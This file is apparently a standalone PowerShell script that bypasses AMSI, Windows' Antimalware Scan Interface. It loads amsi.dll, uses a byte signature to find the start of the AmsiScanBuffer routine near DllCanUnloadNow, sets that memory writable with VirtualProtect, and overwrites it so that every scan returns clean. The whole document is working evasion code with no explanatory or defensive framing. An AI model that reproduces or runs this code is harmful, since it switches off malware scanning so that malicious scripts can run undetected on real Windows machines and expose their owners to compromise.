$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Kernel32
Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0
            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }
        return $address
    }
}
[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
Write-Host "[+] AMSI DLL Handle: $hModule"
[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"
If ([IntPtr]::Size -eq 8) {
	Write-Host "[+] 64-bits process"
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,
        0x49, 0x89, 0x5B, 0x08,
        0x49, 0x89, 0x6B, 0x10,
        0x49, 0x89, 0x73, 0x18,
        0x57,
        0x41, 0x56,
        0x41, 0x57,
        0x48, 0x83, 0xEC, 0x70
    )
} Else {
	Write-Host "[+] 32-bits process"
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,
        0x55,
        0x8B, 0xEC,
        0x83, 0xEC, 0x18,
        0x53,
        0x56
    )
}
[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
Write-Host "[+] Targeted address: $targetedAddress"
$oldProtectionBuffer = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null
$patch = [byte[]] (
    0x31, 0xC0,
    0xC3
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)
$a = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
